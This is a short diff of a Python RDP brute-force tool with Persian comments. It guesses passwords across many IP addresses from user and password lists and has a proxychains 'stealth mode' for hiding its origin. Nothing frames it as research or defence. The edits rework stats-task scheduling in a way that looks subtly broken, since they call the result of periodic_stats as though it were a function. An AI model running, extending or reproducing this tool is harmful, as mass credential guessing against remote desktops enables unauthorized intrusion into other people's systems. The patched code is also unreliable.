@@ -59,7 +59,7 @@ elif args.proxy.endswith('.txt'):
         proxies = [line.strip() for line in f if line.strip()]
     if proxies:
         proxy = random.choice(proxies)
-        PROXY_CMD = f"proxychains -q -f /tmp/proxychains.conf "  # تنظیم کن
+        PROXY_CMD = f"proxychains -q -f /tmp/proxychains.conf "  # تنظیم proxychains.conf خودت
         print(f"[+] Stealth mode: Random proxy ({proxy})")
 else:
     print("[+] Network mode: Direct")
@@ -76,7 +76,10 @@ async def main():
 
     sem = asyncio.Semaphore(MAX_WORKERS)
     loop = asyncio.get_event_loop()
-    loop.create_task(periodic_stats(stats, lock, cpu_proc, stats["start_time"]))
+
+    # کال کردن periodic_stats درست (فیکس اصلی)
+    stats_task = periodic_stats(stats, lock, cpu_proc, stats["start_time"])
+    loop.create_task(stats_task())
 
     tasks = [brute_rdp(ip, sem, USERS, PASSWORD_LIST, PROXY_CMD, args.auto_nla, results_file, stats, lock) for ip in all_ips]
     await asyncio.gather(*tasks, return_exceptions=True)
@@ -87,6 +90,3 @@ async def main():
 signal.signal(signal.SIGINT, lambda s,f: os._exit(0))
 if __name__ == "__main__":
     asyncio.run(main())
-EOF
-
-chmod +x ~/main.py
